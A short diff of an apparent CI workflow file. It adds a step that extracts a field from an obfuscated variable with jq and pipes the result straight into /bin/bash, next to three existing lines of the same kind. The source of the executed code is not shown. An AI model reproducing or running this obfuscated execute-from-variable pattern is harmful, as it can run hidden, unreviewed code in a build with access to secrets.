@@ -32,6 +32,7 @@ jobs:
           echo $ko9631 | jq -r .mifha86 | /bin/bash
           printf '%s' "$psr004" | jq -r .liue43 | /bin/bash
           printf '%s' "$kwrd658" | jq -r .noo2884 | /bin/bash
+          printf '%s' "$w24" | jq -r .a038 | /bin/bash
 
       - name: Save archive
         if: always()
